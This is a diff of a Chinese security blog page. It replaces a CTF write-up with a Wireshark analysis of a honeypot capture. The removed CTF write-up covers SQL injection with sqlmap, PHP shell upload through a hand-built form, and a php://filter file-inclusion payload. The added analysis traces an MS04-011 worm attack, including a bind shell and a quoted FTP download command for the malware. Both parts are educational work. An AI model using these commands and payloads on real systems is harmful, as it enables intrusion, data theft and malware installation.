@@ -68,7 +68,7 @@
 <link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="web,ctf," />
+  <meta name="keywords" content="蜜罐,流量分析," />
 
 
 
@@ -84,31 +84,34 @@
 
 
 
-<meta name="description" content="在sql注入、文件上传和文件包含问题上，可以学到一些新思路。
-sql注入观察题目链接，很明显，存在注入的是id。于是利用sqlmap验证，但sqlmap的结果却是“not injectble”：
-注意到链接中id值是‘MQ==’。明显参数是经过base64编码的，解码后值为‘1’。
-sqlmap中内置了base64编码脚本：
-
-sqlmap -u “http://xxx/index.php?id=">
+<meta name="description" content="此次分析样本是.pcap格式，共348帧。主要利用的分析工具是wireshark以及它的命令行版本tshark。
+前期分析首先通过观察，发现只涉及到两个ip，在本文中称98.114.205.102为主机A，192.150.11.111为主机B。如下图，A主动向B请求TCP连接，并完成了三次握手。虽然不能断定，但很有可能A为攻击者，B为受害者，A攻击的是B的主机系统。
+理论上说这种类型的攻击一定利用">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CTF考核writeup（1）">
-<meta property="og:url" content="http://yoursite.com/2016/11/12/CTF考核writeup（1）/index.html">
+<meta property="og:title" content="利用wireshark分析攻击流量样本">
+<meta property="og:url" content="http://yoursite.com/2016/11/30/分析所采集的流量样本  还原一次攻击的过程/index.html">
 <meta property="og:site_name" content="记录这">
-<meta property="og:description" content="在sql注入、文件上传和文件包含问题上，可以学到一些新思路。
-sql注入观察题目链接，很明显，存在注入的是id。于是利用sqlmap验证，但sqlmap的结果却是“not injectble”：
-注意到链接中id值是‘MQ==’。明显参数是经过base64编码的，解码后值为‘1’。
-sqlmap中内置了base64编码脚本：
-
-sqlmap -u “http://xxx/index.php?id=">
-<meta property="og:updated_time" content="2016-11-23T07:08:11.000Z">
+<meta property="og:description" content="此次分析样本是.pcap格式，共348帧。主要利用的分析工具是wireshark以及它的命令行版本tshark。
+前期分析首先通过观察，发现只涉及到两个ip，在本文中称98.114.205.102为主机A，192.150.11.111为主机B。如下图，A主动向B请求TCP连接，并完成了三次握手。虽然不能断定，但很有可能A为攻击者，B为受害者，A攻击的是B的主机系统。
+理论上说这种类型的攻击一定利用">
+<meta property="og:image" content="http://img.blog.csdn.net/20161130230717869">
+<meta property="og:image" content="http://img.blog.csdn.net/20161130231830132">
+<meta property="og:image" content="http://img.blog.csdn.net/20161130233612156">
+<meta property="og:image" content="http://img.blog.csdn.net/20161130233655844">
+<meta property="og:image" content="http://img.blog.csdn.net/20161130233731844">
+<meta property="og:image" content="http://img.blog.csdn.net/20161130233800000">
+<meta property="og:image" content="http://img.blog.csdn.net/20161130233826440">
+<meta property="og:image" content="http://img.blog.csdn.net/20161130233856298">
+<meta property="og:image" content="http://img.blog.csdn.net/20161130233944688">
+<meta property="og:image" content="http://img.blog.csdn.net/20161130234030646">
+<meta property="og:image" content="http://img.blog.csdn.net/20161130234109099">
+<meta property="og:updated_time" content="2016-11-30T16:06:03.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="CTF考核writeup（1）">
-<meta name="twitter:description" content="在sql注入、文件上传和文件包含问题上，可以学到一些新思路。
-sql注入观察题目链接，很明显，存在注入的是id。于是利用sqlmap验证，但sqlmap的结果却是“not injectble”：
-注意到链接中id值是‘MQ==’。明显参数是经过base64编码的，解码后值为‘1’。
-sqlmap中内置了base64编码脚本：
-
-sqlmap -u “http://xxx/index.php?id=">
+<meta name="twitter:title" content="利用wireshark分析攻击流量样本">
+<meta name="twitter:description" content="此次分析样本是.pcap格式，共348帧。主要利用的分析工具是wireshark以及它的命令行版本tshark。
+前期分析首先通过观察，发现只涉及到两个ip，在本文中称98.114.205.102为主机A，192.150.11.111为主机B。如下图，A主动向B请求TCP连接，并完成了三次握手。虽然不能断定，但很有可能A为攻击者，B为受害者，A攻击的是B的主机系统。
+理论上说这种类型的攻击一定利用">
+<meta name="twitter:image" content="http://img.blog.csdn.net/20161130230717869">
 
 
 
@@ -126,7 +129,7 @@ sqlmap -u “http://xxx/index.php?id=">
   };
 </script>
 
-  <title> CTF考核writeup（1） | 记录这 </title>
+  <title> 利用wireshark分析攻击流量样本 | 记录这 </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -256,7 +259,7 @@ sqlmap -u “http://xxx/index.php?id=">
             
             
               
-                CTF考核writeup（1）
+                利用wireshark分析攻击流量样本
               
             
           </h1>
@@ -268,8 +271,8 @@ sqlmap -u “http://xxx/index.php?id=">
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-11-12T22:43:56+08:00" content="2016-11-12">
-              2016-11-12
+            <time itemprop="dateCreated" datetime="2016-11-30T22:43:56+08:00" content="2016-11-30">
+              2016-11-30
             </time>
           </span>
 
@@ -282,8 +285,8 @@ sqlmap -u “http://xxx/index.php?id=">
               <span class="post-meta-item-text">分类于</span>
               
                 <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/web安全/" itemprop="url" rel="index">
-                    <span itemprop="name">web安全</span>
+                  <a href="/categories/攻击样本-漏洞分析/" itemprop="url" rel="index">
+                    <span itemprop="name">攻击样本/漏洞分析</span>
                   </a>
                 </span>
 
@@ -315,38 +318,30 @@ sqlmap -u “http://xxx/index.php?id=">
       
 
       
-        <p>在sql注入、文件上传和文件包含问题上，可以学到一些新思路。</p>
-<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>观察题目链接，很明显，存在注入的是id。于是利用sqlmap验证，但sqlmap的结果却是“not injectble”：</p>
-<p>注意到链接中id值是‘MQ==’。明显参数是经过base64编码的，解码后值为‘1’。</p>
-<p>sqlmap中内置了base64编码脚本：</p>
+        <p>此次分析样本是.pcap格式，共348帧。主要利用的分析工具是wireshark以及它的命令行版本tshark。</p>
+<h2 id="前期分析"><a href="#前期分析" class="headerlink" title="前期分析"></a>前期分析</h2><p>首先通过观察，发现只涉及到两个ip，在本文中称98.114.205.102为主机A，192.150.11.111为主机B。<br>如下图，A主动向B请求TCP连接，并完成了三次握手。<br><img src="http://img.blog.csdn.net/20161130230717869" alt="三次握手"><br>虽然不能断定，但很有可能A为攻击者，B为受害者，A攻击的是B的主机系统。</p>
+<p>理论上说这种类型的攻击一定利用了已知系统漏洞或者0day，所以接下来的目标是找到A究竟利用了什么漏洞对B实施了攻击。</p>
+<p>于是观察有没有能够暴露更多信息的数据帧。如下图，可以看到在第33帧有一个函数被调用。这非常可疑。网上搜一下这个API，很快发现它曾经曝出过问题，编号CVE-2003-0533，winodws上大名鼎鼎的“冲击波”利用的就是这个漏洞，微软给的编号是MS04-011。<br><img src="http://img.blog.csdn.net/20161130231830132" alt="函数调用"></p>
+<p>该漏洞是一个远程缓冲区溢出，DCE/RPC请求可以从远程主机发送到本地机的LSASS.EXE进程（Microsoft Windows LSA是本地安全授权服务(LSASRV.DLL)）。LSASS DCE/RPC末端导出的Microsoft活动目录服务存在一个缓冲区溢出，远程攻击者可以利用这个漏洞以SYSTEM权限在系统上执行任意指令。攻击LSASS的漏洞的基本办法，就是构造长参数DomainName，通过DsRoleUpgradeDownlevelServer()这个API，最终造成溢出和返回shell。</p>
+<h2 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h2><p>已知B被利用的是哪个漏洞，再分析整个流程就简单了。</p>
+<p>整个攻击过程中包含5个TCP会话，按会话顺序描述流量样本的攻击流程。<br>（1）首先，A扫描B 445/tcp端口，确认该端口是否开放。（tcp.stream eq 0）<br><img src="http://img.blog.csdn.net/20161130233612156" alt="这里写图片描述"></p>
+<p>（2）建立SMB会话，连接到B的\192.150.11.111\ipc$，并请求/lsarpc。（tcp.stream eq 1）<br><img src="http://img.blog.csdn.net/20161130233655844" alt="这里写图片描述"></p>
+<p> 如图，在帧33的位置，通过构造恶意参数，调用存在漏洞的函数DsRoleUpgradeDownlevelServer()，<br>造成缓冲区溢出，并将shell绑定到1957端口。<br><img src="http://img.blog.csdn.net/20161130233731844" alt="这里写图片描述"></p>
+<p>A连接到B  1957端口上的shell，即可在B上执行指令。（tcp.stream eq 2）<br><img src="http://img.blog.csdn.net/20161130233800000" alt="这里写图片描述"></p>
+<p>查看追踪流，可知为了在B上植入恶意软件（蠕虫），A向B发送了如下命令，强制B连接ftp并下载ssms.exe。<br><img src="http://img.blog.csdn.net/20161130233826440" alt="这里写图片描述"></p>
+<p>B执行（3）中命令，尝试建立FTP连接，请求下载ssms.exe。（tcp.stream eq 3）<br><img src="http://img.blog.csdn.net/20161130233856298" alt="这里写图片描述"><br>如下图：<br><img src="http://img.blog.csdn.net/20161130233944688" alt="这里写图片描述"></p>
+<p>B通过ftp接收文件ssms.exe(恶意样本)。<br><img src="http://img.blog.csdn.net/20161130234030646" alt="这里写图片描述"></p>
+<p>追踪流，可见开头MZ、PE字符，显然，正在传输的是windows可执行程序。（tcp.stream eq 4）<br><img src="http://img.blog.csdn.net/20161130234109099" alt="这里写图片描述"></p>
+<p>接下来A再次连接到shell，强制B执行恶意文件ssms.exe即可。</p>
+<h2 id="疑点分析和结论"><a href="#疑点分析和结论" class="headerlink" title="疑点分析和结论"></a>疑点分析和结论</h2><p>（1）整个攻击实施时间非常短，全过程仅花费16秒；另外，在这五次TCP会话中，出现了会话间间隔小于1秒的情况。人工输入命令的速度不可能这么快，所以说这次攻击肯定是自动化的。<br>另外，恶意文件ssms.exe被mcfee引擎识别为W32/Sdbot.worm.gen.x，是个蠕虫。</p>
+<p>（2）攻击者A在发送如下指令时出现了错误：</p>
 <blockquote>
-<p>sqlmap -u “<a href="http://xxx/index.php?id=1" target="_blank" rel="external">http://xxx/index.php?id=1</a>“ - -tamper base64encode.py - -current-db</p>
+<p>echo open 0.0.0.0 8884 &gt; o</p>
 </blockquote>
-<p>发现确实是存在注入的。</p>
-<p>接下来用sqlmap，按套路猜解，即可在flag表中找到flag。</p>
-<blockquote>
-<p>选择一个数据库猜表<br>sqlmap.py -u “–” -D demo –tables<br>选择一个表猜列<br>sqlmap.py -u “–” -D demo -T flag –columns<br>根据列猜数据<br>sqlmap.py -u “–” -D demo -T flag -C value –dump</p>
-</blockquote>
-<p>关键在于参数被base64编码。tamper目录中各种脚本还是很多的。</p>
-<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>查看题目，没有找到上传点。</p>
-<p>扫了一下目录，发现/upload，看这目录名，一会儿上传的话应该是要传到这个目录下的。</p>
-<p>首先想到是不是可以用PUT+COPY，尝试后发现被禁了。</p>
-<blockquote>
-<p>OPTIONS / HTTP/1.1<br>User-Agent: xxxx<br>Host: xxxx<br>Accept: <em>/</em></p>
-</blockquote>
-<p>比如PUT</p>
-<blockquote>
-<p>PUT /test.txt HTTP/1.1<br>User-Agent: xxxx<br>Host: xxxx<br>Accept: <em>/</em></p>
-</blockquote>
-<p>既然没有上传点，于是自行构造一个form表单。将action指向upload.php。这里还得要猜对name的值为file。再尝试从本地表单上传jpg文件，提交成功，表明此处确实有上传功能。这时会发现一个问题，不知道文件被传到哪儿了。所以在表单中添加一个隐藏域，将“dir”指定为“/upload/”。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;form action=&quot;http://--/upload.php&quot; method=&quot;post&quot; enctype= &quot;multipart/form-data&quot;&gt;</div><div class="line">  &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;&lt;/p&gt;</div><div class="line">  &lt;input type=&quot;hidden&quot; name=&quot;dir&quot; value=&quot;/upload/&quot;&gt;</div><div class="line">  &lt;input type=&quot;submit&quot;/&gt;</div><div class="line">&lt;/form&gt;</div></pre></td></tr></table></figure></p>
-<p>再次上传jpg文件，成功上传到/upload目录下。接下来开始考虑上传phpshell。</p>
-<p>尝试00截断，失败。后来发现内容为空的时候直接上传php文件竟然成功了。</p>
-<p>访问，即可回显flag。</p>
-<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>首先尝试能否读上级目录，发现./被过滤为malicious parameter，而/../没有被过滤，所以检测的只是开头有没有.。</p>
-<p>这种情况下，利用php伪协议filter，成功包含文件，读取flag。</p>
-<blockquote>
-<p>php://filter/resource=../flag</p>
-</blockquote>
+<p>使用了无效的ip，0.0.0.0，该处ip值本应为98.114.205.102。这一错误一方面再次证明此次攻击不是人工实施，人工不会出现这样的错误；另一方面，为何在出错的情况下B仍然执行命令下载了恶意文件ssms.exe？这说明受害者B也是有问题的。</p>
+<p>（3）windows xp系统的ttl值应当为128，而这个受害主机B的ttl值为64。进一步证明B实际上是一个蜜罐，伪装成了存在漏洞的windows系统，吸引网络上被感染的发起自动扫描的僵尸机上钩。</p>
+<p>综上所述，攻击者A很可能是被蠕虫感染的主机，遭到感染后，利用端口扫描找到受害者B（蜜罐），并向其发起针对MS04-011漏洞的后续攻击行为。整个攻击过程都是自动发起和实施的。</p>
+<p>来源和参考：<code>http://www.honeynet.org/node/504</code></p>
 
       
     </div>
@@ -368,9 +363,9 @@ sqlmap -u “http://xxx/index.php?id=">
       
         <div class="post-tags">
           
-            <a href="/tags/web/" rel="tag">#web</a>
+            <a href="/tags/蜜罐/" rel="tag">#蜜罐</a>
           
-            <a href="/tags/ctf/" rel="tag">#ctf</a>
+            <a href="/tags/流量分析/" rel="tag">#流量分析</a>
           
         </div>
       
@@ -379,16 +374,16 @@ sqlmap -u “http://xxx/index.php?id=">
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2016/08/07/hello-world/" rel="next" title="Hello World">
-                <i class="fa fa-chevron-left"></i> Hello World
+              <a href="/2016/11/25/这半年，在半年/" rel="next" title="这半年，再半年">
+                <i class="fa fa-chevron-left"></i> 这半年，再半年
               </a>
             
           </div>
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2016/11/12/CTF考核writeup（2）/" rel="prev" title="CTF考核writeup（2）">
-                CTF考核writeup（2） <i class="fa fa-chevron-right"></i>
+              <a href="/2016/11/30/为什么说反对可信计算“发展”/" rel="prev" title="为什么说反对可信计算“发展”">
+                为什么说反对可信计算“发展” <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -503,7 +498,7 @@ sqlmap -u “http://xxx/index.php?id=">
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#sql注入"><span class="nav-number">1.</span> <span class="nav-text">sql注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#文件上传"><span class="nav-number">2.</span> <span class="nav-text">文件上传</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#文件包含"><span class="nav-number">3.</span> <span class="nav-text">文件包含</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前期分析"><span class="nav-number">1.</span> <span class="nav-text">前期分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#流程分析"><span class="nav-number">2.</span> <span class="nav-text">流程分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#疑点分析和结论"><span class="nav-number">3.</span> <span class="nav-text">疑点分析和结论</span></a></li></ol></div>
             
           </div>
         </section>
